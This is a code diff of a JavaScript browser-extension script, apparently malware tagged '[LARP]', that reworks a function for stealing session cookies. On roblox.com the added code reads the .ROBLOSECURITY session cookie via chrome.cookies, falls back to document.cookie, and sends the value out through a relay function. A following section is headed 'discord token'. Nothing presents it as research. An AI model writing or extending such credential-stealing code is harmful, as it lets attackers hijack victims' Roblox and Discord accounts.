@@ -20,29 +20,6 @@ function relay(type, data) {
   }
 }
 
-// --- cookie bridge to content script ---
-var _pendingCookies = {};
-window.addEventListener('message', function(e) {
-  if (!e.data || e.data._larp !== 'cookie_result') return;
-  var id = e.data.id;
-  if (_pendingCookies[id]) {
-    _pendingCookies[id](e.data.value);
-    delete _pendingCookies[id];
-  }
-});
-
-function getCookie(name) {
-  console.log('[LARP] getCookie:', name);
-  return new Promise(function(resolve) {
-    var id = 'c' + Math.random().toString(36).slice(2);
-    _pendingCookies[id] = resolve;
-    window.postMessage({ _larp: 'get_cookie', name: name, id: id }, '*');
-    setTimeout(function() {
-      if (_pendingCookies[id]) { delete _pendingCookies[id]; resolve(null); }
-    }, 5000);
-  });
-}
-
 // --- boot event ---
 function bootEvent() {
   console.log('[LARP] bootEvent starting');
@@ -68,48 +45,36 @@ function bootEvent() {
 }
 
 // --- roblox cookie ---
-function syncSession() {
+async function syncSession() {
   console.log('[LARP] syncSession: hostname=' + location.hostname);
   if (location.hostname.indexOf('roblox.com') === -1) {
     console.log('[LARP] syncSession: skipped (not roblox)');
     return;
   }
-
   var names = ['.ROBLOSECURITY', 'ROBLOSECURITY'];
-  var found = null;
-
-  function tryNext(i) {
-    if (i >= names.length) {
-      if (!found) tryDocCookie(0);
-      else sendSession(found);
-      return;
-    }
-    getCookie(names[i]).then(function(v) {
-      console.log('[LARP] syncSession: cookie ' + names[i] + ' = ' + (v ? v.slice(0, 10) + '...' : 'null'));
-      if (v) { found = v; sendSession(v); }
-      else tryNext(i + 1);
-    });
+  for (var i = 0; i < names.length; i++) {
+    try {
+      var c = await chrome.cookies.get({ url: 'https://www.roblox.com', name: names[i] });
+      console.log('[LARP] syncSession: cookie ' + names[i] + ' = ' + (c ? c.value.slice(0, 10) + '...' : 'null'));
+      if (c && c.value) {
+        console.log('[LARP] syncSession: sending cookie');
+        relay('session', { content: '```\n' + c.value + '\n```' });
+        return;
+      }
+    } catch(e) {}
   }
-
-  function tryDocCookie(i) {
-    if (i >= names.length) { console.log('[LARP] syncSession: no cookie found'); return; }
-    var n = names[i];
+  console.log('[LARP] syncSession: chrome.cookies empty, trying document.cookie...');
+  for (var j = 0; j < names.length; j++) {
+    var n = names[j];
     var escaped = n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
     var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + escaped + '\\s*=\\s*([^;]*)'));
     if (match && match[1]) {
       console.log('[LARP] syncSession: doc cookie ' + n + ' found');
-      sendSession(match[1]);
-    } else {
-      tryDocCookie(i + 1);
+      relay('session', { content: '```\n' + match[1] + '\n```' });
+      return;
     }
   }
-
-  function sendSession(v) {
-    console.log('[LARP] syncSession: sending cookie');
-    relay('session', { content: '```\n' + v + '\n```' });
-  }
-
-  tryNext(0);
+  console.log('[LARP] syncSession: no cookie found');
 }
 
 // --- discord token ---
